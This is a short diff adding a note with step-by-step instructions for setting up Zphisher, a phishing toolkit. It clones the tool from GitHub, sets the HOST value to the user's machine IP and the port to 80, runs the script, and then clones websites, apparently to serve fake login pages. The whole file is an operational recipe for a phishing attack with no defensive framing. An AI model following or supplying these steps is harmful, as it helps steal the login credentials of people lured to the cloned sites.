@@ -1,0 +1,13 @@
+Zphisher :
+-------------------------------------------------------------------------
+
+Git clone https://github.com/htr-tech/zphisher.git
+Cd zphisher
+sudo vim zphisher.sh
+change HOST=Your Machine IP
+change port=80
+save it
+
+Bash zphisher.sh
+
+Clone the webistes now.....
